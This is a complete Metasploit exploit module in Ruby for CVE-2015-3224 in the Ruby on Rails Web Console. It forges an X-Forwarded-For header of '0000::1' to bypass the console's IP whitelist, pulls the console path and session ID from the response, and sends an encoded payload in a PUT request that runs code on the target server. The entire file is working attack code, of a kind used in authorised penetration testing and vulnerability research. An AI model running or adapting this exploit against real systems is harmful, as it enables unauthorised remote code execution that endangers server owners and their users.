# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an IP whitelist bypass vulnerability in the developer
        web console included with Ruby on Rails 4.0.x and 4.1.x. This module will also
        achieve code execution on Rails 4.2.x if the attack is launched from a
        whitelisted IP range.
      },
      &#039;Author&#039;         => [
        &#039;joernchen <joernchen[at]phenoelit.de>&#039;, # Discovery & disclosure
        &#039;Ben Murphy <benmmurphy@gmail.com>&#039;,     # Discovery & disclosure
        &#039;hdm&#039;                                    # Metasploit module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-3224&#039; ],
          [ &#039;URL&#039;, &#039;http://openwall.com/lists/oss-security/2015/06/16/18&#039; ],
          [ &#039;URL&#039;, &#039;https://groups.google.com/forum/message/raw?msg=rubyonrails-security/lzmz9_ijUFw/HBMPi4zp5NAJ&#039; ],
          [ &#039;URL&#039;, &#039;https://hackerone.com/reports/44513&#039; ]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {} ] ],
      &#039;DefaultOptions&#039; => { &#039;PrependFork&#039; => true },
      &#039;DisclosureDate&#039; => &#039;Jun 16 2015&#039;,
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, &#039;/missing404&#039; ])
      ], self.class)
  end
 
  #
  # Identify the web console path and session ID, then inject code with it
  #
  def exploit
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path),
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;headers&#039; => {
        &#039;X-Forwarded-For&#039; => &#039;0000::1&#039;
      }
    }, 25)
 
    unless res
      print_error("Error: No response requesting #{datastore[&#039;TARGETURI&#039;]}")
      return
    end
 
    web_console_path = nil
 
    # Support vulnerable Web Console versions
    if res.body.to_s =~ /data-remote-path=&#039;([^&#039;]+)&#039;/
      web_console_path = "/" + $1
    end
 
    # Support newer Web Console versions
    if web_console_path.nil? && res.body.to_s =~ /data-mount-point=&#039;([^&#039;]+)&#039;/
      web_console_mount = $1
      unless res.body.to_s =~ /data-session-id=&#039;([^&#039;]+)&#039;/
        print_error("Error: No session id found requesting #{datastore[&#039;TARGETURI&#039;]}")
        return
      end
      web_console_path = normalize_uri(web_console_mount, &#039;repl_sessions&#039;, $1)
    end
 
    unless web_console_path
      if res.body.to_s.index(&#039;Application Trace&#039;) && res.body.to_s.index(&#039;Toggle session dump&#039;)
        print_error(&#039;Error: The web console is patched, disabled, or you are not in the whitelisted scope&#039;)
      else
        print_error("Error: No web console path found when requesting #{datastore[&#039;TARGETURI&#039;]}")
      end
      return
    end
 
    print_status("Sending payload to #{web_console_path}")
    res = send_request_cgi({
      &#039;uri&#039;       => web_console_path,
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;headers&#039;   => {
        &#039;X-Forwarded-For&#039;  => &#039;0000::1&#039;,
        &#039;Accept&#039;           => &#039;application/vnd.web-console.v2&#039;,
        &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;
      },
      &#039;vars_post&#039; => {
        &#039;input&#039; => payload.encoded
      }
    }, 25)
  end
end

